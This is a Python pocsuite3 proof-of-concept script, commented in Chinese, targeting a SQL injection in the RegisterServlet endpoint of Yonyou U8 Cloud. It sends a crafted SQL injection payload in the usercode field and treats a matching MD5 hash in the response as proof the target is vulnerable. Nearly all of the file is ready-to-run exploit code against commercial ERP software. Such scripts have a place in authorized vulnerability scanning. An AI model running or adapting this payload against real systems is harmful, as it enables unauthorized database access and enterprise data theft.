'''
Date: 2023-11-19 14:08:24
LastEditTime: 2023-11-19 14:23:56
FilePath: \用友\用友U8-cloud_RegisterServlet_sql注入.py
Description: 

Copyright (c) 2023 by ${git_name_email}, All Rights Reserved. 
'''

from collections import OrderedDict
import re,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-10-07'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-10-07'  # 编写 PoC 的日期
    updateDate = '2023-10-07'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '用友U8 Cloud前台SQL注入'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '用友GPR-U8'  # 漏洞应用名称
    appVersion = '''null'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        U8 Cloud是用友公司推出的企业上云数字化平台，为成长型和创新型企业提供全面的云ERP解决方案。
        该系统RegisterServlet接口存在SQL注入漏洞，攻击者可通过此漏洞未经授权地访问数据库，存在企业数据泄露风险。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        path = '/servlet/RegisterServlet'
        data = "usercode=1' and substring(sys.fn_sqlvarbasetostr(hashbytes('md5','123456')),3,32)>0--"
        header = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
        url = self.url + path
        try:
           
            resq = requests.post(url=url,headers=header,data=data,timeout=5)
            if resq.status_code == 200 and "e10adc3949ba59abbe56e057f20f883e" in resq.text:
                #print(resq_windows.text)
                
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)